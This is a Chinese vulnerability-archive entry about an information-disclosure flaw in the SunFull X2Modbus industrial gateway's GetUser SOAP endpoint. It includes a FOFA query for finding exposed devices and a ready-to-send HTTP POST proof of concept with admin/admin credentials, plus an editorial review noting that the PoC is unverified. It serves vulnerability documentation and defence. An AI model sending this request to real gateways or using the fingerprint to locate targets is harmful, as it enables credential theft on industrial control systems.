---
source: "wy876 漏洞文库"
id: "vw-0fef5128d8f3642242245437"
entity_id: "ve-0fef5128d8f3642242245437"
schema_version: "1"
title: "上海迅饶自动化科技有限公司X2Modbus网关GetUser存在敏感信息泄露"
product: "SunFull迅饶X2Modbus"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "请求内含admin/admin；版本未知"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E6%99%BA%E8%83%BD%E8%AE%BE%E5%A4%87/%E8%BF%85%E9%A5%B6%E8%87%AA%E5%8A%A8%E5%8C%96/%E4%B8%8A%E6%B5%B7%E8%BF%85%E9%A5%B6%E8%87%AA%E5%8A%A8%E5%8C%96%E7%A7%91%E6%8A%80%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8X2Modbus%E7%BD%91%E5%85%B3GetUser%E5%AD%98%E5%9C%A8%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2.md"
review_date: "2026-10-02"
side_effects: "本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/ciccosqccoem25bz"
source_status: "recorded"
previous_fofa_unverified: "server="
fofa: "server=\"SunFull-Webs\" || icon_hash=\"-1384370370\""
---

# 上海迅饶自动化科技有限公司X2Modbus网关GetUser存在敏感信息泄露

> 指纹字段校订（2026-10-04）：本文原归档明确标为 FOFA 的完整表达式已记入 `fofa`；原残缺 `fofa_unverified` 值逐字保存在 `previous_fofa_unverified`。后文关于该字段残缺的旧说明只描述校订前状态。查询用于产品检索，不证明资产受影响。

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：SunFull迅饶X2Modbus
- 本文讨论：soap/GetUser
- 版本、权限与配置前提：请求内含admin/admin；版本未知
- 资料类型：信息泄露请求摘录；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 称未授权却正文提交用户名密码，需证明Password不校验或为绕过，不能默认为匿名
- XML正文配form编码，响应与字段未展示；外部yaml未读取
- FOFA元数据残缺
- 已落实的文本修订：HTTP 报文围栏改为 http；残缺指纹退出可执行索引并保留原值。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本

### 待核与来源

- 密码参数意义、权限边界及响应待核
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


# 一、漏洞简介
X2Modbus是上海迅饶自动化科技有限公司开发的一款功能很强大的协议转换网关， 这里的X代表各家不同的通信协议， 2是To的谐音表示转换， Modbus就是最终支持的标准协议是Modbus协议。用户可以根据现场设备的通信协议进行配置，转成标准的Modbus协议。在PC端仿真运行无误后，上传到硬件协议转换网关。X2Modbus网关GetUser接口存在一个信息泄漏漏洞，使得未经授权的用户或攻击者可以获取管理员登录信息。

# 二、影响版本
+ X2Modbus

# 三、资产测绘
+ fofa`server="SunFull-Webs" || icon_hash="-1384370370"`
+ 特征


# 四、漏洞复现
```http
POST /soap/GetUser HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:123.0) Gecko/20100101 Firefox/123.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 56

<GetUser><User Name="admin" Password="admin"/></GetUser>
```


登录入口

```java
/login.html
```


[X2Modbus-getuser-info.yaml](https://www.yuque.com/attachments/yuque/0/2024/yaml/1622799/1713257450749-41ffa537-94d2-4a1a-acf8-8d523ae4e463.yaml)


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ciccosqccoem25bz>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
